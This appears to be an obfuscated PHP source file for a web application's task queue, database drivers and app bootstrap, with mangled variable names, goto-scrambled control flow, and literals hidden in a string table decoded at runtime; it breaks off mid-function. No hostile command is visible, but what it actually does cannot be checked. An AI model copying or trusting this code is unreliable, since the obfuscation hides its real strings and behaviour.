<?php
 goto Bˆ©ºÕ‰å‚; B§ÛùæÎœ´: class TaskHttp extends Task { protected function startAfter() { $©³È—†õ =& $_SERVER[ÏéâËõ‘]; $­İÛªàŠ =& $this->task; $­İÛªàŠ[$©³È—†õ[1737]] = 1; Hook::bind($©³È—†õ[1705], array($this, $©³È—†õ[1738])); Hook::bind($©³È—†õ[1707], array($this, $©³È—†õ[1739])); Hook::bind($©³È—†õ[1709], array($this, $©³È—†õ[1740])); } protected function endAfter() { $«»ï‹Á =& $_SERVER[ÏéâËõ‘]; Hook::unbind($«»ï‹Á[1705], array($this, $«»ï‹Á[1738])); Hook::unbind($«»ï‹Á[1707], array($this, $«»ï‹Á[1739])); Hook::unbind($«»ï‹Á[1709], array($this, $«»ï‹Á[1740])); } public function progressStart($½ØÆß”«) { $Ì¤ÁÏù =& $_SERVER[ÏéâËõ‘]; $–±“Õ›Ï = curl_getinfo($½ØÆß”«); self::log($Ì¤ÁÏù[1741] . $–±“Õ›Ï[$Ì¤ÁÏù[307]]); self::valueSet($this->task[$Ì¤ÁÏù[399]], $this->task); } public function progressEnd($ÈÍÔÚ) { $Ìˆ×èşï =& $_SERVER[ÏéâËõ‘]; self::log($Ìˆ×èşï[1742] . $this->task[$Ìˆ×èşï[399]]); $this->end(); } public function progress($ŸïÙÙ‘¸, $è¦“Ò«İ, $¹™ºô±², $á¼ä»â€, $ÒÙ§ £´) { $§ê›«Ÿ¯ =& $_SERVER[ÏéâËõ‘]; $¾ßš¾¾µ =& $this->task; if ($ÒÙ§ £´ > 0) { $¾ßš¾¾µ[$§ê›«Ÿ¯[788]] = $¾ßš¾¾µ[$§ê›«Ÿ¯[788]] == 0 ? $á¼ä»â€ : $¾ßš¾¾µ[$§ê›«Ÿ¯[788]]; $¾ßš¾¾µ[$§ê›«Ÿ¯[1663]] = $ÒÙ§ £´; } else { if ($¹™ºô±² > 0) { $¾ßš¾¾µ[$§ê›«Ÿ¯[788]] = $¾ßš¾¾µ[$§ê›«Ÿ¯[788]] == 0 ? $è¦“Ò«İ : $¾ßš¾¾µ[$§ê›«Ÿ¯[788]]; $¾ßš¾¾µ[$§ê›«Ÿ¯[1663]] = $¹™ºô±²; } } $this->update(); self::log("\x70\x72\157\147\x72\145\x73\163\x48\164\x74\x70\72\x64\157\167\156\72{$¹™ºô±²}\x2f{$è¦“Ò«İ}\73\40\x75\160\x6c\157\141\144\x3a{$ÒÙ§ £´}\x2f{$á¼ä»â€}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\165\x65\165\x65\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\x51\x75\x65\x75\145\x44\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($‘ø‘¼’, $¸ÓÑ·ò™ = array(), $ò—óÊƒš = '', $éšéÉúî = '') { $¯È™©ƒ =& $_SERVER[ÏéâËõ‘]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($éšéÉúî && array_find_by_field(self::$listData, $¯È™©ƒ[94], $éšéÉúî)) { return !0; } self::$listData[] = array($¯È™©ƒ[264] => $‘ø‘¼’, $¯È™©ƒ[1743] => $¸ÓÑ·ò™, $¯È™©ƒ[453] => $ò—óÊƒš, $¯È™©ƒ[94] => $éšéÉúî); return !0; } public static function addSubmit() { $²’Ÿãù =& $_SERVER[ÏéâËõ‘]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($²’Ÿãù[1744] . json_encode_force(array_to_keyvalue(self::$listData, $²’Ÿãù[12], $²’Ÿãù[453])), $²’Ÿãù[1745]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($üÁïİºŸ, $øî®¨‹ò = array(), $ßÀÖ¨»Ú = '', $ÊºÊÊäÏ = '') { $ºù¸Ÿ‚Ì =& $_SERVER[ÏéâËõ‘]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÓÛÁÈä– = self::getAll(); if ($ÊºÊÊäÏ && array_find_by_field($ÓÛÁÈä–, $ºù¸Ÿ‚Ì[94], $ÊºÊÊäÏ)) { return !0; } $ÓÛÁÈä–[] = array($ºù¸Ÿ‚Ì[264] => $üÁïİºŸ, $ºù¸Ÿ‚Ì[1743] => $øî®¨‹ò, $ºù¸Ÿ‚Ì[453] => $ßÀÖ¨»Ú, $ºù¸Ÿ‚Ì[94] => $ÊºÊÊäÏ); write_log($ºù¸Ÿ‚Ì[1744] . $ßÀÖ¨»Ú, $ºù¸Ÿ‚Ì[1745]); self::setAll($ÓÛÁÈä–); return !0; } public static function run() { $æ×ËèµÚ =& $_SERVER[ÏéâËõ‘]; $¬¯‚õ‰µ = self::getAll(); $‡·ïßèà = array_shift($¬¯‚õ‰µ); if (!$‡·ïßèà) { return !1; } self::setAll($¬¯‚õ‰µ); $Áıç„ÍÓ = timeFloat(); try { Hook::apply($‡·ïßèà[$æ×ËèµÚ[264]], $‡·ïßèà[$æ×ËèµÚ[1743]]); } catch (Exception $¨ † «È) { } $«Ç Ä‡ = number_format(timeFloat() - $Áıç„ÍÓ, 3) . $æ×ËèµÚ[1678]; write_log($æ×ËèµÚ[1746] . $‡·ïßèà[$æ×ËèµÚ[453]] . $æ×ËèµÚ[1747] . $«Ç Ä‡, $æ×ËèµÚ[1745]); return !0; } public static function count() { $Œ‡Øû×Ï = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Œ‡Øû×Ï) { return 0; } return intval($Œ‡Øû×Ï); } public static function getAll() { $ÌÏşì¬Ø = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ÌÏşì¬Ø) { return array(); } return $ÌÏşì¬Ø; } public static function setAll($¢—µ­‘Ö) { $÷Õ‘ĞÓã = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¢—µ­‘Ö), $÷Õ‘ĞÓã); Cache::set(self::QUEUE_DATA, $¢—µ­‘Ö, $÷Õ‘ĞÓã); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‚´¯‘¬, $í¶ü¨Òı = 5.0) { if (!$‚´¯‘¬) { return; } $¼“óù‘ = Cache::get($‚´¯‘¬); if (!$¼“óù‘ || timeFloat() - floatVal($¼“óù‘) >= $í¶ü¨Òı) { Cache::set($‚´¯‘¬, timeFloat(), $í¶ü¨Òı * 10); return !0; } return !1; } public static function timeLimitCall($¦ûÌ·ù³, $ú„£”ó, $ÁûŒ‡ÏÂ, $å†«ËÇ = 5.0) { $¡²şë‹Ñ =& $_SERVER[ÏéâËõ‘]; if (!$¦ûÌ·ù³ || !$ú„£”ó) { return; } self::$asyncAdd = !0; $ƒˆğí˜¡ = $¡²şë‹Ñ[1748]; $ÊÚàòµÕ = Cache::get($ƒˆğí˜¡, !0); $¤€ÅÑòÉ = array($¡²şë‹Ñ[1749] => timeFloat(), $¡²şë‹Ñ[1750] => timeFloat(), $¡²şë‹Ñ[264] => $ú„£”ó, $¡²şë‹Ñ[1743] => $ÁûŒ‡ÏÂ, $¡²şë‹Ñ[203] => $å†«ËÇ); if (is_array($ÊÚàòµÕ[$¦ûÌ·ù³])) { $¤€ÅÑòÉ[$¡²şë‹Ñ[1750]] = $ÊÚàòµÕ[$¦ûÌ·ù³][$¡²şë‹Ñ[1750]]; } if (is_array($ÊÚàòµÕ[$¦ûÌ·ù³])) { if (timeFloat() - $ÊÚàòµÕ[$¦ûÌ·ù³][$¡²şë‹Ñ[1749]] < $¤€ÅÑòÉ[$¡²şë‹Ñ[203]] * 0.3) { return; } $¤€ÅÑòÉ[$¡²şë‹Ñ[1750]] = $ÊÚàòµÕ[$¦ûÌ·ù³][$¡²şë‹Ñ[1750]]; } $ÊÚàòµÕ[$¦ûÌ·ù³] = $¤€ÅÑòÉ; Cache::set($ƒˆğí˜¡, $ÊÚàòµÕ, 60); Cache::removeMemory($ƒˆğí˜¡); write_log($¡²şë‹Ñ[1751] . $¦ûÌ·ù³ . $¡²şë‹Ñ[71] . $ú„£”ó, $¡²şë‹Ñ[1745]); } public static function timeLimitCallLoop() { $£‡ƒõÏ» =& $_SERVER[ÏéâËõ‘]; $ñß‘˜ã = array($£‡ƒõÏ»[1752]); $¨û‘¿¥ = in_array(strtolower(ACTION), $ñß‘˜ã); if (!$¨û‘¿¥ && !self::$asyncAdd) { return; } $×‹íŠ»ú = $£‡ƒõÏ»[1748]; $áÒÒ‘ğ± = Cache::get($×‹íŠ»ú, !0); if (!$áÒÒ‘ğ± || count($áÒÒ‘ğ±) <= 0) { return; } $ˆ¿ú×Çñ = !1; $›ˆØÕÓİ = timeFloat(); $¦úµ¬¹ = array(); foreach ($áÒÒ‘ğ± as $Ø‘É¬Ã => $ÎÅ˜ßÒÓ) { if ($›ˆØÕÓİ - $ÎÅ˜ßÒÓ[$£‡ƒõÏ»[1750]] > $ÎÅ˜ßÒÓ[$£‡ƒõÏ»[203]]) { $ˆ¿ú×Çñ = !0; try { Hook::apply($ÎÅ˜ßÒÓ[$£‡ƒõÏ»[264]], $ÎÅ˜ßÒÓ[$£‡ƒõÏ»[1743]]); write_log($£‡ƒõÏ»[1753] . $Ø‘É¬Ã . $£‡ƒõÏ»[71] . $ÎÅ˜ßÒÓ[$£‡ƒõÏ»[264]] . $£‡ƒõÏ»[1754] . ACTION, $£‡ƒõÏ»[1745]); } catch (Exception $•‡Â’) { } continue; } $¦úµ¬¹[$Ø‘É¬Ã] = $ÎÅ˜ßÒÓ; } if (!$ˆ¿ú×Çñ) { return; } if (!$¦úµ¬¹) { return Cache::remove($×‹íŠ»ú); } Cache::set($×‹íŠ»ú, $¦úµ¬¹, 60); Cache::removeMemory($×‹íŠ»ú); } public static function finished($è¥´¬¯, $ÀãÅøã”) { $š™ÅÔ¸Û =& $_SERVER[ÏéâËõ‘]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($š™ÅÔ¸Û[264] => $è¥´¬¯, $š™ÅÔ¸Û[1743] => $ÀãÅøã”); } private static function finishedRun() { $ø‹»Öòş =& $_SERVER[ÏéâËõ‘]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $äÏŒÊ¬œ) { try { Hook::apply($äÏŒÊ¬œ[$ø‹»Öòş[264]], $äÏŒÊ¬œ[$ø‹»Öòş[1743]]); } catch (Exception $‡ÃÜËò©) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto AÕ©”î­¸Ÿ; d‡ùà«àò¬: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ä‡íâ» = '') { $‰‹È¿ÑÎ =& $_SERVER[ÏéâËõ‘]; if (!class_exists($‰‹È¿ÑÎ[919])) { think_exception(think_lang($‰‹È¿ÑÎ[14]) . $‰‹È¿ÑÎ[920]); } if (!empty($Ä‡íâ»)) { $this->config = $Ä‡íâ»; if (empty($this->config[$‰‹È¿ÑÎ[17]])) { $this->config[$‰‹È¿ÑÎ[17]] = array(); } } } public function connect($“è£Å´ = '', $©êûÕ•Õ = 0) { $“µ™’øñ =& $_SERVER[ÏéâËõ‘]; if (!isset($this->linkID[$©êûÕ•Õ])) { if (empty($“è£Å´)) { $“è£Å´ = $this->config; } $“¥®ª’ = !empty($“è£Å´[$“µ™’øñ[17]][$“µ™’øñ[18]]) ? $“è£Å´[$“µ™’øñ[17]][$“µ™’øñ[18]] : $this->pconnect; if ($“¥®ª’) { $“è£Å´[$“µ™’øñ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$©êûÕ•Õ] = new PDO($“è£Å´[$“µ™’øñ[921]], $“è£Å´[$“µ™’øñ[893]], $“è£Å´[$“µ™’øñ[894]], $“è£Å´[$“µ™’øñ[17]]); } catch (PDOException $Í‡‚şüğ) { think_exception($Í‡‚şüğ->getMessage()); } $this->dbType = $this->_getDsnType($“è£Å´[$“µ™’øñ[921]]); if (in_array($this->dbType, array($“µ™’øñ[922], $“µ™’øñ[923], $“µ™’øñ[924], $“µ™’øñ[925]))) { think_exception($“µ™’øñ[926] . $this->dbType . $“µ™’øñ[927] . $this->dbType . $“µ™’øñ[928]); } if (!$this->linkID[$©êûÕ•Õ]) { think_exception($“µ™’øñ[929]); } try { $this->linkID[$©êûÕ•Õ]->exec($“µ™’øñ[930] . think_config($“µ™’øñ[896])); } catch (Exception $Í‡‚şüğ) { } $this->connected = !0; if (1 != think_config($“µ™’øñ[22])) { unset($this->config); } } return $this->linkID[$©êûÕ•Õ]; } public function free() { $this->PDOStatement = null; } public function query($à±£ƒı´, $ã¸³Æ¼ = array()) { $ˆô¥ÄŒŒ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $à±£ƒı´; if (!empty($ã¸³Æ¼)) { $this->queryStr .= $ˆô¥ÄŒŒ[931] . print_r($ã¸³Æ¼, !0) . $ˆô¥ÄŒŒ[932]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ˆô¥ÄŒŒ[23], 1); think_status($ˆô¥ÄŒŒ[24]); $this->PDOStatement = $this->_linkID->prepare($à±£ƒı´); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ˆÍçÎ»Ü = $this->PDOStatement->execute($ã¸³Æ¼); $this->debug(); if (!1 === $ˆÍçÎ»Ü) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($€”ñ¾, $Æş”‰¸ = array()) { $‚•ÈÏË£ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€”ñ¾; if (!empty($Æş”‰¸)) { $this->queryStr .= $‚•ÈÏË£[931] . print_r($Æş”‰¸, !0) . $‚•ÈÏË£[932]; } $ÛÖæûÑ = !1; if ($this->dbType == $‚•ÈÏË£[925]) { if (preg_match($‚•ÈÏË£[933], $this->queryStr, $ã­ÒƒÓÜ)) { $this->table = think_config($‚•ÈÏË£[934]) . str_ireplace(think_config($‚•ÈÏË£[935]), $‚•ÈÏË£[378], $ã­ÒƒÓÜ[2]); $ÛÖæûÑ = (bool) $this->query($‚•ÈÏË£[936] . strtoupper($this->table) . $‚•ÈÏË£[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‚•ÈÏË£[25], 1); think_status($‚•ÈÏË£[24]); $this->PDOStatement = $this->_linkID->prepare($€”ñ¾); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $·•ø¯ã’ = $this->PDOStatement->execute($Æş”‰¸); $this->debug(); if (!1 === $·•ø¯ã’) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÛÖæûÑ || preg_match($‚•ÈÏË£[937], $€”ñ¾)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıÌãˆÜÃ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ıÌãˆÜÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $üÄ¹èê» = $this->_linkID->rollback(); $this->transTimes = 0; if (!$üÄ¹èê») { $this->error(); return !1; } } return !0; } private function getAll() { $Öù‚ãƒ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Öù‚ãƒ); return $Öù‚ãƒ; } public function getFields($Ñóó­ÏÏ) { $•Üö†× =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (think_config($•Üö†×[938])) { $½­Ø†­ = str_replace($•Üö†×[939], $Ñóó­ÏÏ, think_config($•Üö†×[938])); } else { switch ($this->dbType) { case $•Üö†×[922]: case $•Üö†×[940]: $½­Ø†­ = "\123\105\x4c\105\103\x54\x20\40\x20\143\157\154\165\155\x6e\137\x6e\141\155\145\x20\x61\x73\40\47\x4e\141\155\145\x27\54\40\x20\x20\144\141\x74\141\x5f\164\171\x70\x65\x20\141\163\40\47\x54\x79\160\x65\47\x2c\x20\x20\40\143\157\154\165\155\156\137\x64\x65\x66\141\165\x6c\x74\x20\141\163\40\47\104\145\x66\141\165\154\x74\x27\x2c\40\40\x20\151\x73\x5f\156\165\154\154\x61\142\154\x65\x20\x61\x73\x20\x27\116\165\154\x6c\x27\12\11\11\106\x52\117\x4d\11\x69\x6e\146\x6f\162\155\141\x74\151\157\156\x5f\x73\143\x68\x65\155\141\56\164\x61\142\x6c\145\163\x20\101\x53\x20\164\12\x9\11\112\x4f\111\x4e\x9\151\156\x66\x6f\162\155\141\164\x69\x6f\156\137\163\x63\x68\x65\155\x61\56\143\x6f\x6c\x75\155\156\163\40\x41\x53\40\x63\12\x9\x9\x4f\x4e\40\40\164\x2e\164\x61\x62\x6c\x65\x5f\x63\141\x74\141\154\x6f\147\x20\x3d\40\x63\x2e\164\x61\142\154\x65\x5f\143\141\x74\141\154\x6f\147\xa\x9\x9\x41\116\x44\x20\x74\56\164\141\x62\x6c\145\137\163\143\150\145\155\x61\x20\75\40\143\56\x74\x61\142\x6c\x65\137\163\143\150\x65\155\x61\xa\11\x9\x41\x4e\104\40\x74\56\164\x61\142\154\x65\x5f\x6e\x61\x6d\x65\x20\75\40\x63\56\x74\141\142\x6c\145\137\x6e\141\155\145\xa\11\x9\x57\x48\x45\122\x45\x20\40\x20\x74\56\164\x61\x62\x6c\145\x5f\x6e\x61\x6d\145\x20\x3d\40\47{$Ñóó­ÏÏ}\x27"; break; case $•Üö†×[941]: $½­Ø†­ = $•Üö†×[942] . $Ñóó­ÏÏ . $•Üö†×[943]; break; case $•Üö†×[923]: case $•Üö†×[925]: $½­Ø†­ = $•Üö†×[944] . $•Üö†×[945] . $•Üö†×[946] . strtoupper($Ñóó­ÏÏ) . $•Üö†×[947] . strtoupper($Ñóó­ÏÏ) . $•Üö†×[948]; break; case $•Üö†×[949]: $½­Ø†­ = $•Üö†×[950] . $Ñóó­ÏÏ . $•Üö†×[951]; break; case $•Üö†×[924]: break; case $•Üö†×[952]: default: $½­Ø†­ = $•Üö†×[953] . ($this->dbType == $•Üö†×[952] ? "\x60{$Ñóó­ÏÏ}\140" : $Ñóó­ÏÏ); } } $§Ã‚â›Æ = $this->query($½­Ø†­); $Î·¢ï—“ = array(); if ($§Ã‚â›Æ) { foreach ($§Ã‚â›Æ as $ì‰îÍ™Ä => $ÇëÉ×Ÿ) { $ÇëÉ×Ÿ = array_change_key_case($ÇëÉ×Ÿ); $ÇëÉ×Ÿ[$•Üö†×[32]] = isset($ÇëÉ×Ÿ[$•Üö†×[32]]) ? $ÇëÉ×Ÿ[$•Üö†×[32]] : $•Üö†×[378]; $ÇëÉ×Ÿ[$•Üö†×[33]] = isset($ÇëÉ×Ÿ[$•Üö†×[33]]) ? $ÇëÉ×Ÿ[$•Üö†×[33]] : $•Üö†×[378]; $ì±š§°è = isset($ÇëÉ×Ÿ[$•Üö†×[273]]) ? $ÇëÉ×Ÿ[$•Üö†×[273]] : $ÇëÉ×Ÿ[$•Üö†×[32]]; $Î·¢ï—“[$ì±š§°è] = array($•Üö†×[32] => $ì±š§°è, $•Üö†×[33] => $ÇëÉ×Ÿ[$•Üö†×[33]], $•Üö†×[35] => (bool) (isset($ÇëÉ×Ÿ[$•Üö†×[103]]) && $ÇëÉ×Ÿ[$•Üö†×[103]] === $•Üö†×[12] || isset($ÇëÉ×Ÿ[$•Üö†×[35]]) && $ÇëÉ×Ÿ[$•Üö†×[35]] === $•Üö†×[12]), $•Üö†×[37] => isset($ÇëÉ×Ÿ[$•Üö†×[37]]) ? $ÇëÉ×Ÿ[$•Üö†×[37]] : (isset($ÇëÉ×Ÿ[$•Üö†×[56]]) ? $ÇëÉ×Ÿ[$•Üö†×[56]] : $•Üö†×[378]), $•Üö†×[39] => isset($ÇëÉ×Ÿ[$•Üö†×[94]]) ? strtolower($ÇëÉ×Ÿ[$•Üö†×[94]]) == $•Üö†×[41] : (isset($ÇëÉ×Ÿ[$•Üö†×[57]]) ? $ÇëÉ×Ÿ[$•Üö†×[57]] : !1), $•Üö†×[42] => isset($ÇëÉ×Ÿ[$•Üö†×[954]]) ? strtolower($ÇëÉ×Ÿ[$•Üö†×[954]]) == $•Üö†×[44] : (isset($ÇëÉ×Ÿ[$•Üö†×[94]]) ? $ÇëÉ×Ÿ[$•Üö†×[94]] : !1)); } } return $Î·¢ï—“; } public function getTables($ôªŞŞª¿ = '') { $±ÄŒìò… =& $_SERVER[ÏéâËõ‘]; if (think_config($±ÄŒìò…[955])) { $äÀ²¬¦’ = str_replace($±ÄŒìò…[956], $ôªŞŞª¿, think_config($±ÄŒìò…[955])); } else { switch ($this->dbType) { case $±ÄŒìò…[923]: case $±ÄŒìò…[925]: $äÀ²¬¦’ = $±ÄŒìò…[957]; break; case $±ÄŒìò…[922]: case $±ÄŒìò…[940]: $äÀ²¬¦’ = $±ÄŒìò…[958]; break; case $±ÄŒìò…[949]: $äÀ²¬¦’ = $±ÄŒìò…[959]; break; case $±ÄŒìò…[924]: think_exception(think_lang($±ÄŒìò…[960]) . $±ÄŒìò…[961]); break; case $±ÄŒìò…[941]: $äÀ²¬¦’ = $±ÄŒìò…[45] . $±ÄŒìò…[46] . $±ÄŒìò…[47]; break; case $±ÄŒìò…[952]: default: if (!empty($ôªŞŞª¿)) { $äÀ²¬¦’ = $±ÄŒìò…[904] . $ôªŞŞª¿ . $±ÄŒìò…[905]; } else { $äÀ²¬¦’ = $±ÄŒìò…[906]; } } } $Ë­§í±¤ = $this->query($äÀ²¬¦’); $ú§¾ ‚¥ = array(); foreach ($Ë­§í±¤ as $‡¨¶êã˜ => $ÇÙ¾íÕŞ) { $ú§¾ ‚¥[$‡¨¶êã˜] = current($ÇÙ¾íÕŞ); } return $ú§¾ ‚¥; } protected function parseLimit($øÜÃì‚Í) { $¡«•œ =& $_SERVER[ÏéâËõ‘]; $ñß¥¡ƒå = $¡«•œ[12]; if (!empty($øÜÃì‚Í)) { switch ($this->dbType) { case $¡«•œ[949]: case $¡«•œ[941]: $øÜÃì‚Í = explode($¡«•œ[50], $øÜÃì‚Í); if (count($øÜÃì‚Í) > 1) { $ñß¥¡ƒå .= $¡«•œ[51] . $øÜÃì‚Í[1] . $¡«•œ[52] . $øÜÃì‚Í[0] . $¡«•œ[53]; } else { $ñß¥¡ƒå .= $¡«•œ[51] . $øÜÃì‚Í[0] . $¡«•œ[53]; } break; case $¡«•œ[922]: case $¡«•œ[940]: break; case $¡«•œ[924]: break; case $¡«•œ[923]: case $¡«•œ[925]: break; case $¡«•œ[952]: default: $ñß¥¡ƒå .= $¡«•œ[51] . $øÜÃì‚Í . $¡«•œ[53]; } } return $ñß¥¡ƒå; } public function parseKey(&$‡öøŸ, $•ãÏÚí = true) { $°ó’—™ó =& $_SERVER[ÏéâËõ‘]; if ($•ãÏÚí) { $‡öøŸ = $this->parseKeyCheck($‡öøŸ); } if ($this->dbType == $°ó’—™ó[952]) { if ($‡öøŸ != $°ó’—™ó[188] && !preg_match($°ó’—™ó[916], $‡öøŸ)) { $‡öøŸ = $°ó’—™ó[385] . trim($‡öøŸ, $°ó’—™ó[385]) . $°ó’—™ó[385]; } return $‡öøŸ; } else { return parent::parseKey($‡öøŸ, $•ãÏÚí); } } public function close() { $this->_linkID = null; } public function error() { $ª‘Á” =& $_SERVER[ÏéâËõ‘]; if ($this->PDOStatement) { $ßÊÈ¯¬Ğ = $this->PDOStatement->errorInfo(); $this->error = $ßÊÈ¯¬Ğ[1] . $ª‘Á”[4] . $ßÊÈ¯¬Ğ[2]; } else { $this->error = $ª‘Á”[12]; } if ($ª‘Á”[12] != $this->queryStr) { $this->error .= LNG($ª‘Á”[48]) . $this->queryStr; } think_trace($this->error, $ª‘Á”[12], $ª‘Á”[49]); return $this->error; } public function escapeString($Á„Œ×Š) { $™ÃÜÇ´ =& $_SERVER[ÏéâËõ‘]; switch ($this->dbType) { case $™ÃÜÇ´[949]: case $™ÃÜÇ´[922]: case $™ÃÜÇ´[940]: case $™ÃÜÇ´[952]: return addslashes($Á„Œ×Š); case $™ÃÜÇ´[924]: case $™ÃÜÇ´[941]: case $™ÃÜÇ´[923]: case $™ÃÜÇ´[925]: return str_ireplace($™ÃÜÇ´[58], $™ÃÜÇ´[59], $Á„Œ×Š); } } protected function parseValue($Êé×û¿) { $€±›æ”¨ =& $_SERVER[ÏéâËõ‘]; if (is_string($Êé×û¿)) { $‰„¥ƒÏ” = strpos($Êé×û¿, $€±›æ”¨[4]) === 0 && in_array($Êé×û¿, array_keys($this->bind)); $Êé×û¿ = $‰„¥ƒÏ” ? $this->escapeString($Êé×û¿) : $€±›æ”¨[962] . $this->escapeString($Êé×û¿) . $€±›æ”¨[962]; } elseif (isset($Êé×û¿[0]) && is_string($Êé×û¿[0]) && strtolower($Êé×û¿[0]) == $€±›æ”¨[297]) { $Êé×û¿ = $this->escapeString($Êé×û¿[1]); } elseif (is_array($Êé×û¿)) { $Êé×û¿ = array_map(array($this, $€±›æ”¨[963]), $Êé×û¿); } elseif (is_bool($Êé×û¿)) { $Êé×û¿ = $Êé×û¿ ? $€±›æ”¨[88] : $€±›æ”¨[197]; } elseif (is_null($Êé×û¿)) { $Êé×û¿ = $€±›æ”¨[103]; } return $Êé×û¿; } public function getLastInsertId() { $×èŸùÀ =& $_SERVER[ÏéâËõ‘]; switch ($this->dbType) { case $×èŸùÀ[949]: case $×èŸùÀ[941]: case $×èŸùÀ[922]: case $×èŸùÀ[940]: case $×èŸùÀ[924]: case $×èŸùÀ[952]: return $this->_linkID->lastInsertId(); case $×èŸùÀ[923]: case $×èŸùÀ[925]: $‚Ÿìü‹¨ = $this->table; $‡îï½¼Ï = $this->query("\x53\105\114\105\103\124\x20{$‚Ÿìü‹¨}\x2e\143\165\162\x72\166\141\x6c\x20\143\165\162\162\x76\141\154\x20\106\x52\x4f\x4d\40\144\165\x61\x6c"); return $‡îï½¼Ï ? $‡îï½¼Ï[0][$×èŸùÀ[964]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($³•ßïõ) { $ãÄÄ†±ó =& $_SERVER[ÏéâËõ‘]; if (!CacheLock::fileLock($ãÄÄ†±ó[13])) { return !1; } $½Å”Ö„Ä = parent::query($³•ßïõ); CacheLock::fileUnLock($ãÄÄ†±ó[13]); return $½Å”Ö„Ä; } public function execute($Œ¹¾“ŸÛ) { $ê¾ Ş‰ =& $_SERVER[ÏéâËõ‘]; if (!CacheLock::fileLock($ê¾ Ş‰[13])) { return !1; } $—“ä•Ñ¤ = parent::execute($Œ¹¾“ŸÛ); CacheLock::fileUnLock($ê¾ Ş‰[13]); return $—“ä•Ñ¤; } } class DbSqlite3 extends DbSqlite3Base { public function query($êÖ¯‡Û) { $’¡×Ó¦Ç =& $_SERVER[ÏéâËõ‘]; if (!CacheLock::fileLock($’¡×Ó¦Ç[13])) { return !1; } $ºü±ÒØ› = parent::query($êÖ¯‡Û); CacheLock::fileUnLock($’¡×Ó¦Ç[13]); return $ºü±ÒØ›; } public function execute($Î¹î×º“) { $Ô„¡Ãæ• =& $_SERVER[ÏéâËõ‘]; if (!CacheLock::fileLock($Ô„¡Ãæ•[13])) { return !1; } $ÆŸø«× = parent::execute($Î¹î×º“); CacheLock::fileUnLock($Ô„¡Ãæ•[13]); return $ÆŸø«×; } } goto f§ÚÃ„Õ°©; Eâ»”¨‚°ã: $_SERVER[…¡Î×İ¶] = explode($_SERVER[ÏéâËõ‘][616], gzinflate(substr($_SERVER[ÏéâËõ‘][617], 10, -8))); $ckxrmqfoel = $_SERVER[ÏéâËõ‘][618]; class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($™†î•ÅŞ) { $³ŞğşÎà =& $_SERVER[ÏéâËõ‘]; $—×—„Ù =& $_SERVER[…¡Î×İ¶]; $†”ôÃœ‹ = explode($—×—„Ù[0], trim($™†î•ÅŞ, $—×—„Ù[0])); $this->defaultModule = $†”ôÃœ‹[0] ? $†”ôÃœ‹[0] : $this->defaultModule; $this->defaultController = $†”ôÃœ‹[1] ? $†”ôÃœ‹[1] : $this->defaultController; $Á¼ö’ğ = $³ŞğşÎà[619]; while ($Á¼ö’ğ < $³ŞğşÎà[620]) { if ($Á¼ö’ğ >= 0) { break; } $Á¼ö’ğ++; } $this->defaultAction = $†”ôÃœ‹[2] ? $†”ôÃœ‹[2] : $this->defaultAction; $êŠ¯¿¾… = $³ŞğşÎà[621]; if (!$êŠ¯¿¾…) { die; } $this->cfqw168c4d05($—×—„Ù[1], array($this, $—×—„Ù[2])); } public function appRun($°Ùˆóåœ) { $´Ã½çã– =& $_SERVER[…¡Î×İ¶]; $Ä²œØ = explode($´Ã½çã–[0], $°Ùˆóåœ); $İÅ×¹Î» = strtolower($Ä²œØ[0]); $œî÷ÑµÚ = $_SERVER[ÏéâËõ‘][622]; $Ù¢•ô¤Ö = $´Ã½çã–[3]; if ($İÅ×¹Î» == $´Ã½çã–[4]) { $Ù¢•ô¤Ö = $´Ã½çã–[5]; $Ä²œØ[0] = $´Ã½çã–[6]; $Ä²œØ[1] = $Ä²œØ[1] . $´Ã½çã–[7]; $°Ùˆóåœ = join($´Ã½çã–[0], $Ä²œØ); $°Ùˆóåœ = trim($°Ùˆóåœ, $´Ã½çã–[0]); } call_user_func(array($´Ã½çã–[8], $´Ã½çã–[9]), $Ù¢•ô¤Ö . $´Ã½çã–[10], $°Ùˆóåœ); 